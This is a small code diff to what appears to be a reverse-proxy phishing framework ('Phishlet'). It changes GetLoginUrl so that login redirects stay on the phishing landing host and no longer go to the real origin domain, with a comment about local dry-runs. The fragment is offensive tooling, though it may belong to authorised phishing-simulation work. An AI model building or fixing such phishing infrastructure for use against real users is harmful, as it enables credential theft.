@@ -802,7 +802,15 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 }
 
 func (p *Phishlet) GetLoginUrl() string {
-	return "https://" + p.login.domain + p.phishkitPortSuffix() + p.login.path
+	// Stay on the phishing landing host (not the origin login.domain).
+	// With a non-443 https_port, using login.domain produced
+	// https://portal.example.com:8443/login which hits the real CDN and
+	// fails TLS — local dry-runs must redirect to e.g. portal.*.phishkit:8443.
+	host := p.GetLandingPhishHost()
+	if host == "" {
+		host = p.login.domain
+	}
+	return "https://" + host + p.phishkitPortSuffix() + p.login.path
 }
 
 func (p *Phishlet) GetLandingPhishHost() string {
